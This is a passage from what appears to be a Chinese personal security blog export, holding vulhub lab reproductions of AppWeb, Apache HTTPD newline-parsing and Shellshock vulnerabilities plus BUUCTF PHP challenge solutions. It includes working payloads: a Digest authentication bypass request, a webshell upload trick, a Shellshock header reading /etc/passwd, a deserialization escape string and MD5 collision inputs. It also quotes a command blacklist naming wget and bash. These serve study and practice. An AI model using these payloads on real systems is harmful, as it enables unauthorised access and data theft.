<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
</ul>
<p>路径：</p>
<ul>
<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
</ul>
<p>启动环境：</p>
<ul>
<li><code>sudo docker-compose up -d</code></li>
<li>输入 <code>http://ip:8080</code> 即可访问</li>
</ul>
<p>前提：</p>
<ul>
<li>已知某个用户名为 <code>admin</code></li>
</ul>
<h1 id="复现">复现</h1>
<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>（最后两个空行很重要！）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
<ul>
<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
</ul>
<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>AppWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
<p>成功获得 webshell。</p>
<h1 id="总结">总结</h1>
<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
<h1 id="资源">资源</h1>
<ol type="1">
<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <url>/2022/04/09/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B安洵杯%202019%5Deasy_serialize_php">easy_serialize_php</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入之后，点击<code>source_code</code>，出现如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<p>经过提示，先<code>?f=phpinfo</code>查看一下有什么信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409200107.png" /></p>
<p>想必这个文件肯定与flag有关。</p>
<h1 id="解题">解题</h1>
<p>从代码来看，我们应该需要通过<code>echo file_get_contents(base64_decode($userinfo['img']));</code>读取flag，那么<code>f</code>的值就是<code>show_image</code>。</p>
<p>现在就是如何让<code>_SESSION['img']=flag文件</code>。如果传入<code>img_path</code>参数，那么就会经过<code>sha1()</code>，即使我们输入的是flag文件名，也会变成hash值从而无法读取。所以我们不能传入<code>img_path</code>。那么此时的<code>_SESSION['img']=guest_img.png</code>。</p>
<p>那需要怎么做才能将值变成我们想要的值呢？这里就涉及到了<strong>反序列化字符串逃逸</strong>。</p>
<p>先介绍以下<code>extract()</code>函数，这个函数会导致变量覆盖漏洞，这也是本题的考点之一。正常情况下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>但是如果我们通过该函数，POST方式传入如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flag&amp;_SESSION[function]=flag</span><br></pre></td></tr></table></figure></p>
<p>那么此时变量就会被覆盖： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="反序列化字符串逃逸">反序列化字符串逃逸</h2>
<p>其实有两种情况，本题涉及到的是<strong>字符串变少</strong>的情况。</p>
<p>正常情况下情况： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>]=<span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;guest_img.png&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;guest_img.png&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的字符串也能够通过反序列化转为数组：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202554.png" /></p>
<p>设想如下的字符串能否通过反序列化转为数组？如果可以，数组的值为什么？ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409202910.png" /></p>
<p>虽然字符串中<code>s:4:"user";s:33:"";</code>33后面的双引号中应该存在33个字符，才满足序列化的规律。查看结果发现，<code>function</code>这个键不见了，而多了一个<code>hdf</code>的键。</p>
<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;</span><br><span class="line"></span><br><span class="line">从33后的第一个双引号之后取33个字符：&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image，这33个字符正好被一对双引号包括，因此，系统会认为这就是user的值。然后后面的s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;正好也满足序列h规律，因为这个数组有3个值，所以s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;也成为了数组的键值。</span><br></pre></td></tr></table></figure></p>
<p>所以这个字符串还是满足序列化的特征的，只不过利用某种办法让原来的user的33个字符消失了，从而将后面的字符串（我们注入的字符串）当作原来数组中的数据。从而实现了逃逸。</p>
<p>需要注意的是 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:33:&quot;&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;s:3:&quot;hdf&quot;;s:3:&quot;zzf&quot;;&#125;1341414141412412412</span><br></pre></td></tr></table></figure></p>
<p>也能够成功。因为反序列化时只要<code>a:3:&#123;s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";&#125;</code>满足规律，并且已经能够返回数组了，那么后面的字符串就会被丢弃。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409203924.png" /></p>
<h2 id="本题利用">本题利用</h2>
<p>先直接给出payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: f=show_image</span><br><span class="line"></span><br><span class="line">POST: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述的内容通过序列化得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是，flag会被过滤，导致变成如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>而<code>user</code>的值的24个字符往后找，正好是<code>";s:8:"function";s:59:"a</code>。从而将上面的字符串分为几大部分： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;</span><br><span class="line">s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;</span><br><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</span><br><span class="line">s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">&quot;;s:3:&quot;img&quot;;s:13:&quot;guest_img.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>前四行正好能够满足序列化后的字符串的规律，因此对上述字符串反序列得到的数组如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204732.png" /></p>
<p>成功将我们想要读取的文件名注入。最后的那个只是因为数组需要三个键值对从而凑得。</p>
<p>其实<code>d0g3_f1ag.php</code>读取到的是flag文件名是什么。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409204918.png" /></p>
<p>将flag文件名base64编码后替代原来文件名的位置（注意长度是否有变化）即可（注意那个斜杠也是文件名的一部分！）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409205037.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化字符串逃逸</tag>
        <tag>PHP变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
<span id="more"></span>
<h1 id="漏洞信息">漏洞信息</h1>
<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
<p>影响版本： - bash version &lt;= 4.3</p>
<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
<h1 id="复现">复现</h1>
<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>破壳漏洞</tag>
        <tag>shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，先检查了源码，发现了返回了一张图片经过base64编码后的内容。并且有一句提示：<code>md5 is funny</code>。然后观察url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d835c69c-0e67-4191-8b98-d25591d19b6e.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br></pre></td></tr></table></figure></p>
<p>注意到两个参数<code>cmd</code>和<code>img</code>。后者的内容像是经过base64编码的，因此先进行解码。推荐网址：https://gchq.github.io/CyberChef/</p>
<p>调用<code>magic</code>模块，发现编码规则，先经过两次base64，然后再进行16进制解码还原原来的字符串。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220118.png" /></p>
<p>因此，这里可以传入一个文件名。虽然有可能只接受图片，但是作为尝试可以试一下<code>index.php</code>。</p>
<h1 id="解题">解题</h1>
<p>首先将<code>index.php</code>进行编码，然后传入img参数，cmd先保持不变。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220308.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401220429.png" /></p>
<p>将返回的内容base64解码后得到如下代码（重要部分）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">	</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;      <span class="comment">// img不能含有flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;  <span class="comment">// 会将系统命令执行</span></span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>echo `$cmd`; 这句话会将 cmd 变量作为系统命令执行并输出，像是echo system($cmd)</p>
</blockquote>
<p>这个代码可以分为两个部分，第一部分关于img参数，主要作用就是读取文件内容；第二部分就是cmd参数，主要作用就是命令执行。由于img过滤了flag，所以读取flag的内容应该通过命令执行获得。即重要的是第二部分。</p>
<p>第二部分有一个难题，那就是如何绕过如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></p>
<p>如果只有后者，可以通过传入数组绕过，但是前面的却无法这样绕过。因此只能使用md5碰撞来绕过，也就是两个字符串不一样，但是它们md5值一样，从网上找到了两组： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span 